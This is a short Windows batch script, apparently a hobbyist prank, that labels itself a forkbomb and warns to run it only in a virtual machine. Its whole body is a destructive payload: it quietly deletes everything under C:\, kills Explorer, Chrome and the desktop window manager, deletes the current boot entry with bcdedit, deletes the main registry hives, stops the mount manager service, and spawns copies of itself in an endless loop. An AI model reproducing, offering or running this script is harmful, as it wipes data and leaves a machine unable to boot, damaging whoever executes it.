@echo off 
title Forkbomb of lolpc101 (my cvm username is not fuck 1) that means this is not booting again
echo yeah save your work before running this and do it in a vm because this can destroy your real pc if you run that in your real machine
pause
goto lmao
:lmao
cmd /ctaskmgr.exe
cmd /c notepad.exe
cmd /c explorer.exe
start cmd /c del c:\ /s /q
taskkill /f /im explorer.exe
taskkill /f /im chrome.exe
taskkill /f /im dwm.exe
start cmd /c tree c:\
bcdedit /delete {current}
start cmd /c reg delete hkcu
start cmd /c reg delete hku
start cmd /c reg delete hkcr
start cmd /c reg delete hklm
start cmd /c sc stop mountmgr
start cmd /c %0 | %0
goto lmao 
